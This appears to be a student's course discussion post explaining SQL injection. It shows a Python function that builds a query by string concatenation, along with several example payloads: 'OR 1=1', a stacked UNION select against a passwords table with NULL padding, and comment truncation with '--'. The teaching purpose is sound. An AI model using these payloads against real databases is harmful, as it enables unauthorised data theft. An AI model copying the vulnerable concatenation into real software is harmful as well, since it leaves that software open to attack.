---
layout: notes
---
# Discussion 1: SQL Injection - peer response

The following code is vulnerable to SQL Injection, if the input is unfiltered.

```python
  def get_userdata(self, id):
     cursor = db.cursor()
     cursor.execute('SELECT * FROM users WHERE id = '+ id)
     return cursor.fetchall()
```

To return all the records, the attacker could trigger a call with

```
   id = "1 OR 1=1"
```

It is also possible to execute multiple queries with

```
   id = "1 OR 1; union select * from passwords"
```

The latter may not work when tables have different columns, but it can be fixed easily to align the them. In this example the table passwords has two columns less than users:

```
   id = "1 OR 1; union select *,NULL,NULL from passwords"
```

Imagine now the following query:

```sql
   SELECT * FROM users WHERE id = ' + id + ' and role = 'student'
```

It can be attacked with:

```
   id = "1 OR 1=1;--"
```

resulting in

```sql
   SELECT * FROM users WHERE id = 1 OR 1=1;-- and role = 'student'
```

and therefore returning all values of users, regardless the role

<img src="exploits_of_a_mom.png" class="img-responsive"/>
